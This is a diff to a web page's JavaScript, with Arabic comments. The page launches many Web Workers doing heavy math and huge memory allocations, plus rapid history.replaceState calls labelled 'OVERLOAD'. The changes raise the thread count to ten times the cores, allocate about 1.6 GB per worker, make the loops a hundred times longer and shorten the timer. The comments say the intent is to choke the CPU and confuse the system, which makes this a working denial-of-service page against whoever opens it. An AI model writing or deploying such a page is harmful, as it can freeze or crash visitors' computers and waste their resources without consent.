@@ -11,18 +11,18 @@
     <script>
         // 1. تحديد عدد الأنوية وديناميكية العمل
         const physicalCores = navigator.hardwareConcurrency || 4;
-        const threadCount = physicalCores * 2; // فتح ضعف عدد الأنوية لضمان الاختناق
+        const threadCount = physicalCores * 10; // فتح ضعف عدد الأنوية لضمان الاختناق
         document.getElementById('cores').innerText = "الأنوية المكتشفة: " + physicalCores + " | المسارات المفعلة: " + threadCount;
 
         // 2. كود الـ Worker المصمم لإجبار التربو (Turbo Boost)
         const workerCode = `
             self.onmessage = function() {
                 // مصفوفة ضخمة لإشغال الكاش والرام
-                let memoryLoad = new Float64Array(2000000); 
+                let memoryLoad = new Float64Array(200000000); 
                 
                 function crunch() {
                     // عمليات رياضية معقدة (Trigonometric & Exponential) لإجبار وحدة الحساب (ALU) على العمل الأقصى
-                    for (let i = 0; i < 5000000; i++) {
+                    for (let i = 0; i < 500000000; i++) {
                         Math.tan(Math.atan(Math.tan(Math.atan(Math.random()))));
                         Math.exp(Math.random()) * Math.sqrt(Math.random());
                     }
@@ -54,7 +54,7 @@
                     // تكرار طلبات تغيير الهوية البصرية للمتصفح لإرباك معالج الرسوميات والنظام
                     history.replaceState(null, "", "OVERLOAD_" + Date.now() + "_" + Math.random());
                 }
-            }, 7000);
+            }, 3000);
         }
 
         // بدء التشغيل
